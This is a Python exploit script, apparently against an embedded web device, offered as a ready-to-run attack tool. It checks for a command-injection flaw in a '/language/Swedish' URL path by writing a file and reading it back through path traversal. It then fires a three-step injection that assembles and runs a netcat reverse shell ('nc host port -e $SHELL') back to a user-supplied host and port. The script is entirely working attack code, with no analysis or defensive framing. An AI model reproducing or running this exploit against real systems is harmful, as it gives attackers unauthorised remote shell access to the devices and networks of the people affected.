#!/usr/bin/python

__author__ = 'Rotem Kerner'

from sys import argv
import optparse
from urlparse import urlparse
from re import compile
import socket
import requests
from requests.exceptions import ConnectionError, Timeout, ContentDecodingError
from socket import timeout




def main():

    # parse command line options and atguments
    optparser = optparse.OptionParser(usage="%s <target-url> [options]" % argv[0])
    optparser.add_option('-c','--check',action="store_true",dest="checkvuln", default=False,
                         help="Check if target is vulnerable")
    optparser.add_option('-e','--exploit', action="store", type="string", dest="connback",
                         help="Fire the exploit against the given target URL")

    (options, args) = optparser.parse_args()

    try:
        target = args[0]
    except IndexError:
        optparser.print_help()
        exit()

    target_url = urlparse(target)

    # validating hostname
    if not target_url.hostname:
        print "[X] supplied target \"%s\" is not a valid URL" % target
        optparser.print_help()
        exit()

    # A little hack to handle read timeouts, since urllib2 doesnt give us this functionality.
    socket.setdefaulttimeout(10)

    # is -c flag on check if target url is vulnrable.
    if options.checkvuln is True:
        print "[!] Checking if target \"%s\" is vulnable..." % target_url.netloc
        try:

            # Write file
            raw_url_request('%s://%s/language/Swedish${IFS}&&echo${IFS}1>test&&tar${IFS}/string.js'
                         % (target_url.scheme, target_url.netloc))

            # Read the file.
            response = raw_url_request('%s://%s/../../../../../../../mnt/mtd/test' % (target_url.scheme, target_url.netloc))


            # remove it..
            raw_url_request('%s://%s//language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js'
                         % (target_url.scheme, target_url.netloc))

        except (ConnectionError, Timeout, timeout) as e:
            print "[X] Unable to connect. reason: %s.  exiting..." % e.message
            return
        if response.text[0] != '1': 
            print "[X] Expected response content first char to be '1' got %s. exiting..." % response.text
            return

        print "[V] Target \"%s\" is vulnerable!" % target_url.netloc



    # if -e is on then fire exploit,
    if options.connback is not None:

        # Validate connect-back information.
        pattern = compile('(?P<host>[a-zA-Z0-9\.\-]+):(?P<port>[0-9]+)')
        match = pattern.search(options.connback)
        if not match:
            print "[X] given connect back \"%s\" should be in the format for host:port" % options.connback
            optparser.print_help()
            exit()

        # fire remote code execution!

        # Three ..
        try:
            raw_url_request('%s://%s/language/Swedish${IFS}&&echo${IFS}nc${IFS}%s${IFS}%s${IFS}>e&&${IFS}/a'
                        % (target_url.scheme, target_url.netloc, match.group('host'), match.group('port')))

        # Two ...

            raw_url_request('%s://%s/language/Swedish${IFS}&&echo${IFS}"-e${IFS}$SHELL${IFS}">>e&&${IFS}/a'
                         % (target_url.scheme, target_url.netloc))


        # One. Left off!
            raw_url_request('%s://%s/language/Swedish&&$(cat${IFS}e)${IFS}&>r&&${IFS}/s'
                         % (target_url.scheme, target_url.netloc))

        except (ConnectionError, Timeout, timeout) as e:
            print "[X] Unable to connect reason: %s.  exiting..." % e.message



        print "[V] Exploit payload sent!, if nothing went wrong we should be getting a reversed remote shell at %s:%s" \
              % (match.group('host'), match.group('port'))


# Disabling URL encode hack
def raw_url_request(url):
    r = requests.Request('GET')
    r.url = url
    r = r.prepare()
    # set url without encoding
    r.url = url

    s = requests.Session()
    return s.send(r)



if __name__ == '__main__':
    main()
